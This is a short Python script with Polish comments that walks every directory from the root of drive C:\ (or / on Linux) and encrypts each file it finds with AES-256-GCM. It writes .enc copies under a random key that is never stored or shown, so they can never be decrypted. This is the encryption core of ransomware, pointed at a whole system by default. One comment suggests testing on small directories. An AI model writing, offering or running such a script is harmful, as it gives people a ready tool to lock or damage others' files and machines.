import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Funkcja szyfrująca plik (AES-GCM)
def encrypt_file(input_file, key):
    try:
        cipher = AES.new(key, AES.MODE_GCM)
        with open(input_file, 'rb') as f:
            data = f.read()

        encrypted_data, tag = cipher.encrypt_and_digest(data)

        # Zapisujemy: IV (nonce), tag i ciphertext
        output_file = input_file + ".enc"
        with open(output_file, 'wb') as f:
            f.write(cipher.nonce)        # 16 bajtów
            f.write(tag)                 # 16 bajtów
            f.write(encrypted_data)
        
        print(f"Szyfrowanie zakończone: {input_file} -> {output_file}")
    except Exception as e:
        print(f"Błąd podczas szyfrowania {input_file}: {e}")

# Funkcja, która przechodzi przez wszystkie pliki w systemie i szyfruje je
def encrypt_all_files_on_system(root_dir, key):
    for dirpath, dirnames, filenames in os.walk(root_dir):  # Przechodzi przez wszystkie katalogi
        for filename in filenames:
            try:
                file_path = os.path.join(dirpath, filename)
                # Sprawdzenie, czy plik ma rozszerzenie .enc, aby nie szyfrować już zaszyfrowanych plików
                if not file_path.endswith('.enc'):
                    encrypt_file(file_path, key)
            except Exception as e:
                print(f"Błąd szyfrowania pliku {filename}: {e}")

# Generowanie losowego klucza AES-256
key = get_random_bytes(32)

# Określenie katalogu root, od którego zaczynamy (na przykład C:\ na Windows lub / na Linuxie)
# Na Windowsie można użyć np. 'C:\\'
# Na Linuxie '/'

# UWAGA: To może zająć bardzo dużo czasu i zasobów, więc lepiej testować na małych katalogach!
root_dir = 'C:\\'  # Na Windowsie, jeśli chcesz szyfrować wszystkie pliki na całym dysku.
#root_dir = '/'  # Na Linuxie

# Szyfrowanie wszystkich plików w systemie
encrypt_all_files_on_system(root_dir, key)
